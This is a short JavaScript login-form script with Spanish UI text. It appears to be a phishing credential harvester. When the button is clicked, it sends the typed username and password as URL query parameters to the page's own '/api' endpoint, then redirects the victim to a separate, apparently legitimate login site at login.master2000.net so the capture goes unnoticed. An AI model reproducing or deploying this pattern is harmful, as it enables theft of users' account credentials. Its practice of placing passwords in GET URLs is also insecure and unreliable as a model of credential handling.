
const form = document.querySelector("#login_form");

const field_name = document.querySelector("#login_user");
const field_password = document.querySelector("#login_password");

const button = document.querySelector("#button_teacher");

const Post_teacher = async(user = "", password = "") => {    

    fetch(`/api?user=${user}&password=${password}`) 
    .then(function(res){ return res.json(); })
    .then(function(data){ console.log( JSON.stringify( data ) ) })
}

button.addEventListener("click", async() => {
    if (!form.checkValidity()) {
        alert("Ingrese datos validos")
    } else {
        await Post_teacher(field_name.value,field_password.value);
        window.location.replace("https://login.master2000.net/ingreso/index.php?AB=a032fcb23791785424ed5df2b020671d&DC=a032fcb23791785424ed5df2b020671d&MG=1&");

    }
})